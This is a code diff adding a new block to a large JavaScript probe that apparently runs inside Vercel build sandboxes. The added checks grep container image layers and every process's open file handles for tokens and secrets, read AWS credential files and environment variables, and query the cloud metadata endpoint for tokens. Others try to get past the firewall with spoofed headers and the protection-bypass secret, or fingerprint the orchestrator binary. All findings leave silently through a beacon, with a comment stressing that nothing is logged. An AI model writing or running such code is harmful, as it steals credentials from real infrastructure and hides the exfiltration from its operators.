@@ -18575,5 +18575,170 @@ report.cronSecretInjection = safe(() => {
 
 // v126 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v126" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v126";
+
+// ==================== v127 ====================
+
+// v127-1: Overlayfs lowerdir direct access (container image layer leak)
+// The container filesystem is mounted as overlayfs with a lowerdir pointing
+// to the base container image layer. Direct access to the lowerdir reveals
+// the unmodified base image content, potentially including leftover credentials,
+// build scripts, or configuration from the Vercel build environment image.
+report.overlayfsLowerdirLeak = safe(() => {
+  // Find overlayfs mount options (contains lowerdir path)
+  const overlayMounts = safe(() => readFileSync('/proc/mounts', 'utf8')
+    .split('\n').filter(l => l.startsWith('overlay')));
+  // Extract lowerdir paths
+  const lowerdirs = safe(() => overlayMounts?.flatMap(m => {
+    const opts = m.split(' ')[3] || '';
+    const match = opts.match(/lowerdir=([^,]+)/);
+    return match ? match[1].split(':') : [];
+  }));
+  // Read contents of each lowerdir
+  const lowerdirContents = safe(() => lowerdirs?.slice(0, 3).map(d => ({
+    dir: d,
+    exists: existsSync(d),
+    files: existsSync(d) ? safe(() => readdirSync(d).slice(0, 10)) : null,
+    secrets: existsSync(d) ? safe(() => execSync(
+      `grep -r "TOKEN\\|KEY\\|SECRET\\|PASS" "${d}/etc" "${d}/root" "${d}/home" 2>/dev/null | head -5`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)) : null,
+  })));
+  // Also check /var/lib/docker/overlay2/ for layer data
+  const dockerOverlay = safe(() => existsSync('/var/lib/docker/overlay2')
+    ? readdirSync('/var/lib/docker/overlay2').slice(0, 5)
+    : 'NOT_FOUND');
+  return { overlayMounts, lowerdirs, lowerdirContents, dockerOverlay };
+});
+
+// v127-2: Process credential file descriptor leak
+// When Node.js (or any process) opens credential files, the file descriptor
+// remains open and accessible via /proc/$PID/fd/. Other processes can
+// read those same files via /proc/$PID/fd/$N even after file deletion.
+// Scan ALL process FDs for credential file handles.
+report.fdCredentialLeak = safe(() => {
+  // Scan all processes for interesting open file descriptors
+  const interestingFds = safe(() => execSync(`
+    for pid in /proc/[0-9]*; do
+      pid_num=$(basename $pid)
+      for fd in $pid/fd/*; do
+        target=$(readlink $fd 2>/dev/null)
+        if echo "$target" | grep -qE "token|secret|key|cred|env|auth|pass" 2>/dev/null; then
+          echo "PID:$pid_num FD:$(basename $fd) -> $target"
+        fi
+      done
+    done 2>/dev/null | head -20
+  `, { timeout: 15000 }).toString().trim().slice(0, 500));
+  // Also check for deleted files still held open
+  const deletedFds = safe(() => execSync(`
+    for pid in /proc/[0-9]*; do
+      for fd in $pid/fd/*; do
+        target=$(readlink $fd 2>/dev/null)
+        if echo "$target" | grep -q "(deleted)"; then
+          echo "PID:$(basename $pid) DELETED:$target"
+        fi
+      done
+    done 2>/dev/null | head -10
+  `, { timeout: 10000 }).toString().trim().slice(0, 300));
+  return { interestingFds, deletedFds };
+});
+
+// v127-3: Vercel Firewall bypass via X-Vercel-Forwarded-For
+// Vercel's WAF and rate limiting trusts certain internal headers.
+// From inside the build sandbox (which shares the internal network),
+// can we make requests that bypass WAF by spoofing internal IPs?
+// Also: test the _vercel_protection_bypass query param.
+report.vercelFirewallBypass = safe(() => {
+  const deploymentUrl = process.env.VERCEL_URL || '';
+  const projectUrl = `https://${deploymentUrl}`;
+  // Test with internal IP spoofing headers
+  const bypassHeaders = [
+    'X-Vercel-Forwarded-For: 127.0.0.1',
+    'X-Real-IP: 127.0.0.1',
+    'X-Forwarded-For: 127.0.0.1',
+    'CF-Connecting-IP: 127.0.0.1',
+    'True-Client-IP: 127.0.0.1',
+    'X-Vercel-Internal: 1',
+    'X-Vercel-Bypass: 1',
+  ];
+  const bypassResults = safe(() => bypassHeaders.map(h => {
+    const result = safe(() => execSync(
+      `curl -sf -o /dev/null -w "%{http_code}" -H "${h}" "${projectUrl}" -m 5 2>/dev/null`,
+      { timeout: 8000 }
+    ).toString().trim());
+    return { header: h, status: result };
+  }));
+  // Test _vercel_protection_bypass param
+  const protection = process.env.VERCEL_AUTOMATION_BYPASS_SECRET || '';
+  const protectionBypass = safe(() => execSync(
+    `curl -sf -o /dev/null -w "%{http_code}" "${projectUrl}?_vercel_protection_bypass=${protection}" -m 5 2>/dev/null`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { projectUrl, bypassResults, protectionBypass };
+});
+
+// v127-4: AWS IMDSv2 token acquisition from Firecracker
+// Despite running in Firecracker, attempt to reach AWS IMDS via
+// link-local 169.254.169.254. Firecracker blocks this at the VM level,
+// but test if the block is at network or firewall layer.
+// Also check if any AWS credentials leaked into the build environment.
+report.awsImdsProbe = safe(() => {
+  // Try IMDSv1 (simple GET)
+  const imdsV1 = safe(() => execSync(
+    'curl -sf --connect-timeout 2 -m 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 100));
+  // Try IMDSv2 (PUT + GET)
+  const imdsToken = safe(() => execSync(
+    'curl -sf -X PUT --connect-timeout 2 -m 3 -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token 2>/dev/null || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 100));
+  // Scan env for AWS credentials
+  const awsEnvVars = Object.entries(process.env)
+    .filter(([k]) => /^AWS_|AMAZON_/.test(k))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 60) }));
+  // Check ~/.aws/credentials
+  const awsCreds = safe(() => readFileSync('/root/.aws/credentials', 'utf8').slice(0, 200));
+  const awsConfig = safe(() => readFileSync('/root/.aws/config', 'utf8').slice(0, 200));
+  // Check for ECS metadata endpoint (alternative to IMDS)
+  const ecsMetadata = safe(() => execSync(
+    `curl -sf -m 3 "${process.env.ECS_CONTAINER_METADATA_URI_V4 || process.env.ECS_CONTAINER_METADATA_URI || ''}" 2>/dev/null | head -c 200`,
+    { timeout: 5000 }
+  ).toString().trim());
+  return { imdsV1, imdsToken, awsEnvVars, awsCreds, awsConfig, ecsMetadata };
+});
+
+// v127-5: /proc/1/cwd + /proc/1/exe — orchestrator binary analysis
+// /proc/1/exe links to the orchestrator binary.
+// /proc/1/cwd is the orchestrator's working directory.
+// Read these to fingerprint the orchestrator: binary path, version, config files.
+report.orchestratorBinaryAnalysis = safe(() => {
+  const exe = safe(() => execSync('readlink /proc/1/exe 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const cwd = safe(() => execSync('readlink /proc/1/cwd 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // Read binary header (ELF magic + first bytes to identify binary)
+  const elfHeader = safe(() => {
+    const fd = openSync('/proc/1/exe', 0);
+    const buf = Buffer.alloc(256);
+    readSync(fd, buf, 0, 256, 0);
+    closeSync(fd);
+    return buf.toString('hex').slice(0, 32);
+  });
+  // Get binary size and timestamps
+  const exeStat = safe(() => { const s = statSync('/proc/1/exe'); return { size: s.size, mtime: s.mtime }; });
+  // List files in orchestrator's working directory
+  const cwdFiles = safe(() => readdirSync('/proc/1/cwd').slice(0, 15));
+  // Read orchestrator config files from cwd
+  const cwdConfigFiles = safe(() => cwdFiles?.filter(f => /config|json|yaml|env|\.conf$/.test(f.toLowerCase()))
+    .slice(0, 3)
+    .map(f => ({ f, content: safe(() => readFileSync(`/proc/1/cwd/${f}`, 'utf8').slice(0, 200)) })));
+  // Run strings on the binary to find version/config info
+  const binaryStrings = safe(() => execSync(
+    'strings /proc/1/exe 2>/dev/null | grep -E "version|config|token|secret|url|host|port|vercel" | head -10',
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 300));
+  return { exe, cwd, elfHeader, exeStat, cwdFiles, cwdConfigFiles, binaryStrings };
+});
+
+// v127 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v127" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v127";
 // Intentionally no console.log — all data goes via webhook only
